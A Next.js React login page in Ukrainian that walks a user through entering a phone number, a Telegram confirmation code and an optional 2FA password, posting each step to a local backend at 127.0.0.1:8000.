"use client";

import { useState } from 'react';

export default function LoginPage() {
  const [step, setStep] = useState('phone');
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isLoading) return;

    setError('');
    setIsLoading(true);

    try {
      const response = await fetch('http://127.0.0.1:8000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step, phone, code, password }),
      });
      
      const data = await response.json();

      if (data.status === 'need_code') {
        setStep('code');
      } else if (data.status === 'need_password') {
        setStep('password');
      } else if (data.status === 'success') {
        // Після успішного входу повертаємо людину на головну сторінку
        window.location.href = '/';
      } else {
        setError(data.message || 'Сталася помилка');
      }
    } catch (err) {
      setError('Не вдалося зв\'язатися з сервером');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#212121', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: 'white', fontFamily: 'Arial' }}>
      
      <div style={{ fontSize: '60px', marginBottom: '20px' }}>
        {step === 'phone' && '📱'}
        {step === 'code' && '🔢'}
        {step === 'password' && '🔒'}
      </div>

      <h1 style={{ marginBottom: '20px' }}>
        {step === 'phone' && 'Вхід за номером телефону'}
        {step === 'code' && 'Введіть код підтвердження'}
        {step === 'password' && 'Введіть пароль 2FA'}
      </h1>

      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '15px', width: '300px' }}>
        {step === 'phone' && (
          <>
            <input type="text" placeholder="+380..." value={phone} onChange={(e) => setPhone(e.target.value)} style={{ padding: '12px', borderRadius: '8px', border: '1px solid #555', backgroundColor: '#2c2c2c', color: 'white' }} />
            <button type="submit" style={{ padding: '12px', borderRadius: '8px', border: 'none', backgroundColor: '#8774e1', color: 'white', cursor: 'pointer', opacity: isLoading ? 0.5 : 1 }}>
              {isLoading ? 'Зачекайте...' : 'Далі'}
            </button>
          </>
        )}

        {step === 'code' && (
          <>
            <input type="text" placeholder="12345" value={code} onChange={(e) => setCode(e.target.value)} style={{ padding: '12px', borderRadius: '8px', border: '1px solid #555', backgroundColor: '#2c2c2c', color: 'white' }} />
            <button type="submit" style={{ padding: '12px', borderRadius: '8px', border: 'none', backgroundColor: '#8774e1', color: 'white', cursor: 'pointer', opacity: isLoading ? 0.5 : 1 }}>
              {isLoading ? 'Зачекайте...' : 'Підтвердити'}
            </button>
          </>
        )}

        {step === 'password' && (
          <>
            <input type="password" placeholder="Пароль 2FA" value={password} onChange={(e) => setPassword(e.target.value)} style={{ padding: '12px', borderRadius: '8px', border: '1px solid #555', backgroundColor: '#2c2c2c', color: 'white' }} />
            <button type="submit" style={{ padding: '12px', borderRadius: '8px', border: 'none', backgroundColor: '#8774e1', color: 'white', cursor: 'pointer', opacity: isLoading ? 0.5 : 1 }}>
              {isLoading ? 'Зачекайте...' : 'Увійти'}
            </button>
          </>
        )}
      </form>

      {error && <p style={{ color: 'red', marginTop: '20px' }}>{error}</p>}

      <a href="/" style={{ marginTop: '20px', color: '#aaa', textDecoration: 'none' }}>← Назад до робіт</a>

      <div style={{ borderTop: '1px solid #444', marginTop: '40px', paddingTop: '20px', textAlign: 'center', color: '#aaa', fontSize: '14px' }}>
        <p>1. Введіть ваш номер телефону</p>
        <p>2. Введіть код з Telegram</p>
        <p>3. Введіть пароль 2FA, якщо він є</p>
      </div>
    </div>
  );
}